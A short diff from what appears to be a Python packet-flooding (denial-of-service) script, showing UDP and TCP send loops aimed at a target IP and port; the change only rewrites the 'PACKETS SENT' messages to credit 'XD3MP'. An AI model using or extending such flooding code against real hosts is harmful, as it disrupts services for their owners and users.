@@ -33,7 +33,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS SENT!!!")
+			print(i +" PACKETS SENT TO IP & PORT BY XD3MP!!!")
 		except:
 			s.close()
 			print("DOWN!!!")
@@ -48,7 +48,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PACKETS SENT!!!")
+			print(i +" PACKETS SENT TO IP & PORT BY XD3MP!!!")
 		except:
 			s.close()
 			print("DOWN!!!")
